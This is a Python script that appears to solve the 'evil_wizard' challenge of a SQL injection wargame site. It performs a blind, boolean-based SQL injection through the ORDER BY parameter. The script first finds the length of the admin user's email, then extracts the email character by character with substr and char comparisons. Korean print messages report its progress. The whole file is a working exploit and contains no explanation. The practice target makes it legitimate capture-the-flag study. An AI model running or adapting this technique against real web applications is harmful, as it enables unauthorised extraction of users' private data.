# -*- coding: utf-8 -*-
import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order="
head = {'Cookie' : 'PHPSESSID=값'}

length = 1
email = ''

while (1):
    query = "if(id='admin' and length(email)='{}',1,9999)%23".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "<th>score</th><tr><td>admin" in req.text:
        print("총 길이는",length)
        break
    else:
        length += 1

for i in range(1, length+1):
    for j in range(33, 122):
        query = "if(id='admin' and substr(email,{},1)=char({}),1,9999)%23".format(str(i), j)
        req = requests.get(url+query, headers=head)
        if "<th>score</th><tr><td>admin" in req.text:
            email += chr(j)
            print(i,"번째 문자 찾는 중 .. : ",email)
            break
        
            
print("EMAIL : ",email.lower())